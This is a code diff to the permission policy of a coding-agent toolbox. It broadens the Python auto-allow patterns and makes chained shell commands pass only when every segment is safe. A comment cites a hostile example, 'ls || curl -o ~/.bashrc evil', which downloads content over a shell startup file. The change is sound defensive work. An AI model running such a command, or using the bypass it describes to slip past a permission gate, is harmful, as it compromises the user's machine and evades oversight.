@@ -738,12 +738,12 @@ _DEFAULT_BASH_AUTO_ALLOW: tuple[str, ...] = (
     r"^\s*tar\s+-?t",                                        # tar list-only
     r"^\s*unzip\s+-l\b",
     # -- (b) coding workflow ---------------------------------------------
-    r"^\s*python3?\s+-c\s+",
-    r"^\s*python3?\s+--version\b",
-    r"^\s*python3?\s+-m\s+(?:py_compile|pytest|unittest|doctest|timeit|venv|"
+    r"^\s*python(?:3(?:\.\d+)?)?\s+-c\s+",
+    r"^\s*python(?:3(?:\.\d+)?)?\s+--version\b",
+    r"^\s*python(?:3(?:\.\d+)?)?\s+-m\s+(?:py_compile|pytest|unittest|doctest|timeit|venv|"
     r"pip\s+show|pip\s+list|pip\s+freeze|"
     r"compileall|json\.tool|http\.server|delfin(?:\.\w+)*)\b",
-    r"^\s*python3?\s+\S+\.py\b",                             # run a script in repo
+    r"^\s*python(?:3(?:\.\d+)?)?\s+\S+\.py\b",                             # run a script in repo
     r"^\s*pip\s+(?:show|list|freeze|check)\b",
     r"^\s*conda\s+(?:info|list|env\s+list|search)\b",
     r"^\s*(?:pytest|py\.test)\b",
@@ -884,6 +884,49 @@ _DEFAULT_PATH_PROTECTED_GLOBS: tuple[str, ...] = (
 )
 
 
+def _split_shell_segments(cmd: str) -> list[str]:
+    """Split a shell command into the segments chained by ``||``, ``&&``,
+    ``;``, ``|`` or newline, ignoring operators inside single/double quotes.
+
+    Used so the auto-allow check can require EVERY segment to be safe rather
+    than trusting a compound by its first segment. Redirect ``&`` (``2>&1``,
+    ``>&``) is preserved — only ``&&`` splits, not a lone ``&`` — so common
+    redirects don't fragment a segment. Quoted operators (``grep 'a|b'``) are
+    left intact. Empty/whitespace-only segments are dropped.
+    """
+    segs: list[str] = []
+    buf: list[str] = []
+    q: str | None = None
+    i, n = 0, len(cmd)
+    while i < n:
+        c = cmd[i]
+        if q is not None:
+            buf.append(c)
+            if c == q:
+                q = None
+            i += 1
+            continue
+        if c in ("'", '"'):
+            q = c
+            buf.append(c)
+            i += 1
+            continue
+        if cmd[i:i + 2] in ("||", "&&"):
+            segs.append("".join(buf))
+            buf = []
+            i += 2
+            continue
+        if c in (";", "|", "\n"):
+            segs.append("".join(buf))
+            buf = []
+            i += 1
+            continue
+        buf.append(c)
+        i += 1
+    segs.append("".join(buf))
+    return [s.strip() for s in segs if s.strip()]
+
+
 @dataclass
 class KitToolPermissions:
     """Permission policy for KIT-Toolbox coding-agent tools.
@@ -1013,6 +1056,20 @@ class KitToolPermissions:
         return None
 
     def matches_bash_auto_allow(self, cmd: str) -> bool:
+        # A command is auto-allowed only if EVERY shell segment is individually
+        # auto-allowed. Start-anchored patterns alone would trust a compound by
+        # its first (safe) segment — e.g. ``ls || curl -o ~/.bashrc evil`` —
+        # leaving the dangerous tail to the deny-list as the sole backstop. By
+        # requiring all of ``a || b``, ``a && b``, ``a ; b``, ``a | b`` to
+        # match, a mixed compound falls through to the gate, while an all-safe
+        # compound (``python3.10 --version || which python3.10 || echo nf``)
+        # still runs unattended.
+        segments = _split_shell_segments(cmd)
+        if not segments:
+            return False
+        return all(self._segment_auto_allowed(s) for s in segments)
+
+    def _segment_auto_allowed(self, cmd: str) -> bool:
         for pat in self.bash_auto_allow_patterns:
             if re.search(pat, cmd, re.IGNORECASE):
                 return True
